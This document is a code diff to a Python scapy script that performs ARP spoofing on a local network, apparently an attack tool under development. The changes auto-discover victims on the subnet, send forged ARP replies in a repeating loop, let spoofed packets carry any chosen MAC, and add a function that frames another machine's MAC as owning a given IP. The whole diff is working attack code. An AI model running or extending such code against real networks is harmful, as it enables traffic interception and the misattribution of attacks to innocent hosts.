@@ -17,9 +17,9 @@ def get_mac(ip):
     response_mac = None
     if ip == ATTACKER_IP :
         response_mac = ATTACKER_MAC
-    if ip in victim_addresses.keys() :
+    elif ip in victim_addresses.keys() :
         response_mac = victim_addresses[ip]
-    if ip == router_ip and router_mac:
+    elif ip == router_ip:
         response_mac = router_mac
     
     if response_mac:
@@ -46,12 +46,12 @@ def get_mac(ip):
         sys.exit(0)
 
  
-  
-def arp_spoof(target_ip, spoof_ip):
+#send to target_ip that given mac is spoof_ip
+def arp_spoof(target_ip, spoof_ip, mac=ATTACKER_MAC): 
     """"Create and send ARP packet"""
     arp = scapy.ARP(op=2, pdst=target_ip,
                        hwdst=get_mac(target_ip), psrc=spoof_ip)
-    ether = scapy.Ether(src=ATTACKER_MAC)
+    ether = scapy.Ether(src=mac)
     packet = ether/arp
     scapy.sendp(packet, verbose=False, iface=IFACE)
 
@@ -89,20 +89,19 @@ def arp_prep(manual, router, input_iface):
 #Automated code
 victim_addresses = {}
 router_ip = None
-current_ip = None
 iface = None
 router_mac = None
 
 def arp_prep_automated(router_ip_, iface_ = "enp0s10") :
-    global victim_addresses, router_ip, iface, current_ip
-    global IFACE, ATTACKER_MAC
+    global victim_addresses, router_ip, iface
+    global IFACE, ATTACKER_MAC, ATTACKER_IP
 
     IFACE = iface_
 
-    current_ip = scapy.get_if_addr(iface_)
+    ATTACKER_IP = scapy.get_if_addr(iface_)
     ATTACKER_MAC = scapy.get_if_hwaddr(iface_)
     
-    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
+    subnet = ATTACKER_IP.rsplit('.', 1)[0] #split rightmost number off
 
     if not router_ip_:
         router_ip = subnet + '.1'
@@ -116,8 +115,8 @@ def arp_prep_automated(router_ip_, iface_ = "enp0s10") :
         except :
             pass #does not exist
 
-    if current_ip in victim_addresses:
-        del victim_addresses[current_ip]
+    if ATTACKER_IP in victim_addresses:
+        del victim_addresses[ATTACKER_IP]
     
     
     print("Victims: ", str(victim_addresses))
@@ -182,3 +181,11 @@ def arp_loop():
     while arp_looping:
         arp_tick()
         time.sleep(5)
+
+
+framed_mac = None
+def arp_frame(ip): #have framed_mac claim that they are the given ip
+    for victim in victim_addresses.keys() :
+        arp_spoof(victim, ip, framed_mac)
+
+
